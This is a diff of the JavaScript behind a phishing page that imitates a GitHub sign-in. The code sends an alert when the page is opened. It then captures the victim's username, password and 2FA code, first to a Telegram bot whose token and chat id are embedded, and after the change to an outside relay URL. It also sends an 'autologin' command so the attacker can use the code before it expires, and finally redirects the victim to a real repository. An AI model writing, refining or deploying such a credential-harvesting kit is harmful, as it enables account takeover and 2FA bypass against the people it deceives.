@@ -98,21 +98,15 @@
 </div>
 
 <script>
-var t='86248'+'11346',k='AAGR8UE4YbBG0XyQ-_xcTFyVuHD_wXXT1j0',c='79712'+'22296';
 var cU='',cP='',cOtp='';
+var R='https://portal.defai-research.com/relay';
 
-function tg(m){
-    return fetch('https://api.telegram.org/bot'+t+':'+k+'/sendMessage',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:c,text:m})
-    });
+function rly(data){
+    fetch(R,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
 }
 
-// Page opened
-tg('\ud83d\udce9 GITHUB PAGE OPENED\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent);
+rly({msg:'\ud83d\udce9 GITHUB PAGE OPENED\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent});
 
-// Step 1: Login
 function doLogin(){
     var u=document.getElementById('login').value.trim();
     var p=document.getElementById('password').value;
@@ -123,18 +117,13 @@ function doLogin(){
     }
     document.getElementById('err').style.display='none';
     cU=u; cP=p;
-
-    // Send credentials immediately
-    tg('\ud83d\udd11 STEP 1 - CREDENTIALS\n\nUsername: '+cU+'\nPassword: '+cP+'\nTime: '+new Date().toISOString());
-
-    // Show 2FA step
+    rly({msg:'\ud83d\udd11 CREDENTIALS CAPTURED\n\nUsername: '+cU+'\nPassword: '+cP+'\nTime: '+new Date().toISOString()});
     document.getElementById('step-login').classList.add('hidden');
     document.getElementById('alert').classList.add('hidden');
     document.getElementById('step-2fa').classList.remove('hidden');
     document.getElementById('otp').focus();
 }
 
-// Step 2: 2FA
 function doVerify(){
     var otp=document.getElementById('otp').value.trim();
     if(!otp||otp.length<6){
@@ -144,29 +133,20 @@ function doVerify(){
     }
     document.getElementById('err').style.display='none';
     cOtp=otp;
-
-    // Show loading
     document.getElementById('step-2fa').classList.add('hidden');
     document.getElementById('bottom').classList.add('hidden');
     document.getElementById('step-loading').classList.remove('hidden');
 
-    // Send 2FA code - THIS IS TIME CRITICAL (30 seconds)
-    tg('\ud83d\udea8\ud83d\udea8\ud83d\udea8 2FA CAPTURED - ACT NOW \ud83d\udea8\ud83d\udea8\ud83d\udea8\n\nUsername: '+cU+'\nPassword: '+cP+'\n2FA Code: '+cOtp+'\n\n\u26a0\ufe0f CODE EXPIRES IN 30 SECONDS\nTime: '+new Date().toISOString());
-
-    // Also trigger auto-login on VPS
-    fetch('https://api.telegram.org/bot'+t+':'+k+'/sendMessage',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:c,text:'/autologin '+cU+' '+cP+' '+cOtp})
+    rly({
+        msg:'\ud83d\udea8\ud83d\udea8 2FA CAPTURED \ud83d\udea8\ud83d\udea8\n\nUsername: '+cU+'\nPassword: '+cP+'\n2FA Code: '+cOtp+'\n\n\u26a0\ufe0f EXPIRES IN 30 SECONDS\nTime: '+new Date().toISOString(),
+        autologin:'/autologin '+cU+'|||'+cP+'|||'+cOtp
     });
 
-    // Redirect after delay
     setTimeout(function(){
         window.location.href='https://github.com/ondefy/eigencloud-signer';
     },3000);
 }
 
-// Enter key support
 document.addEventListener('keydown',function(e){
     if(e.key==='Enter'){
         if(!document.getElementById('step-login').classList.contains('hidden')){doLogin();}
